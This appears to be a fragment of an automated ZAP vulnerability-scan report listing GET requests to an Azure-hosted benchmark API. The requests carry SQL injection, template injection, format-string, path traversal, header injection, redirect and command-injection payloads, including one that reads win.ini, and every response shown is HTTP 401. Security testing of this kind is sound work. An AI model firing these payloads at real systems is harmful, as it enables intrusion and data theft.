LgcnlWYTwfRZUvtsCDDjycRVyvpAELSmvBZTsZWfHwfDDyFJouCOCfvucfyHLhbdUOqllywXUAyftQlUPyWvrsyYZPsggwKcsIMYDZEGedBqyfKxBDdDFMUFEXWJGdftKXwnKgTXBaQbgvmshNceirDlwxvwMShhwMYTypHtNQDBjkyWPNVGpCiilEleMoaYdKrwYpBGtHETPwncmNqPmdyNpTHlqEGOGATBkndpsJLwNHDOWsDHILiLIxmnksSlcyFqodRjbuMTFwAFEVUtqBleMZMQvHfyfrxsKpaWJjxOqWhKSXViYEGUiyWHPCntZwsJDDSeySLVeMNUGjLORgjnlCLipSKsFgxKqvsgGZdBCpZenkmnOcZTgKnqXasFvOBlyvZdnUvURsXKiItFqNkYGUgQuEOfCbVwneNatvuVOseUIXVSVgfyjGZgxBaJSqKBrXYPgjgEXnHCapZhEVMwseyqbbLEEHbjCNkxtgLpBYdRiDShDFyQUkhJLmkUSdoEqeQJdcJrZGUpMTXQHAjqJrekfHGtbOCTftxwFXZGZEZwKdIUXYFuVefoEHNIXBsReJZhbYDuwgJkkFdcrFNjQqrgjrnjNAbtSeiBxBwNmolHsDMVuHOGSDByWvjffrZfdqfkvdJITLyihAOExDQcvVCHwuGgmauynKaTstaxcjhyrDWHceENiwjahnZHDutDvMEtWXecHbQLUNiOBYHhYYWGgTPfKwvXEBKAfSKwlaKZnfrhsEWIJeSlLldkXVRiagUVrvbZNtUucHSkWCJUZSoYKxCMaYihTXkkhecLXgnJrdqGuvjndlmYaNOhFfqbFsLNdRZxkmcQNquafQtoLXPYBehXCuABhIEXUQDcWYLHxqXmVYtZOOJqOtWKBSHNCsHIlnLIajVVTdoSICAvnDaGovqiQxEGVvfJTkvSkIKBasdEoPDLSoexfTjKDDjNsqqUlbkuiVYPxQCFQqygnMXQkWhUevqRopApOqNeksjbhlgImgoweTEOrYOZItKPXClNntQtAuPsbPOUiEupSoaCucymtQVefDdoNCJfUkJQsAWhQISgvhFJJbAcyqyNXEycFtcaKUIgGDAibBhLLdywBXbDihZNmYfHempEDfNJUMsNsVSiTGUCMuPUfAEsdJQArXAINQjnUetuRSGYpbClNfZVpLNlEjhgMJuqGwJMYrJnbDlXmPknQYaoMZeGZFohcrRLohrwjdJVoEcheghcMhCvPbfKFPZGbCdOfYAVkGqvyJQNgWGoFlyjFLxhLKcSo&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=ZAP&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zApPX71sS&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%2523%257B4145*9565%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%2523set%2528%2524x%253D6172*3713%2529%2524%257Bx%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%2524%257B9475*4789%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%253C%2525%253D7991*8517%2525%253Ezj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%253Cp+th%253Atext%253D%2522%2524%257B6342*1161%257D%2522%253E%253C%252Fp%253Ezj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%25231450*1320%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%25403119*3700%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%2540math+key%253D%25222731%2522+method%253D%2522multiply%2522+operand%253D%25226036%2522%252F%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%257B%253D5103*7247%257D%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%257B1861*2194%257D%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%257B27670%257Cadd%253A90250%257D%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B%257Bprint+%25225079%2522+%25225092%2522%257D%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj%257B5745*4174%257Dzj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=zj+7997*5348+zj&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+%252F+sleep%252815%2529+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+AND+1%253D1+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+AND+1%253D2+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+or+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+OR+1%253D1+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+UNION+ALL+select+NULL+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school+where+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school0W45pz4p&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=Set-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=thishouldnotexistandhopefullyitwillnot&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=type+%2525SYSTEMROOT%2525%255Cwin.ini&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=user-data&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=vu4ntfijeoj4zdqm4a1np6vctq39qwos160gyfekg99jvlh2ixzu2mvvetk&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=WEB-INF%252Fweb.xml&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=WEB-INF%255Cweb.xml&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=www.google.com%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=www.google.com%252Fsearch%253Fq%253DZAP&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=www.google.com%253A80%252F&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=www.google.com%253A80%252Fsearch%253Fq%253DZAP&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=www.google.com&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=ZAP%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%2525n%2525s%250A&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=ZAP&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=ZAP+%25251%2521s%25252%2521s%25253%2521s%25254%2521s%25255%2521s%25256%2521s%25257%2521s%25258%2521s%25259%2521s%252510%2521s%252511%2521s%252512%2521s%252513%2521s%252514%2521s%252515%2521s%252516%2521s%252517%2521s%252518%2521s%252519%2521s%252520%2521s%252521%2521n%252522%2521n%252523%2521n%252524%2521n%252525%2521n%252526%2521n%252527%2521n%252528%2521n%252529%2521n%252530%2521n%252531%2521n%252532%2521n%252533%2521n%252534%2521n%252535%2521n%252536%2521n%252537%2521n%252538%2521n%252539%2521n%252540%2521n%250A&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zApPX69sS&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%2523%257B1303*9635%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%2523set%2528%2524x%253D1231*6684%2529%2524%257Bx%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%2524%257B5739*7600%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%253C%2525%253D9316*3761%2525%253Ezj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%253Cp+th%253Atext%253D%2522%2524%257B5335*9188%257D%2522%253E%253C%252Fp%253Ezj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%25237700*5065%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%25407785*6242%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%2540math+key%253D%25228048%2522+method%253D%2522multiply%2522+operand%253D%25229784%2522%252F%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%257B%253D3070*3696%257D%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%257B2567*5094%257D%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%257B37750%257Cadd%253A65340%257D%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B%257Bprint+%25223136%2522+%25221426%2522%257D%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj%257B2254*1609%257Dzj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=zj+7120*3158+zj&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+%252F+case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+%252F+sleep%252815%2529+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+and+0+in+%2528select+sleep%252815%2529+%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+AND+1%253D1+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+AND+1%253D2+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set+and+exists+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+--+&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
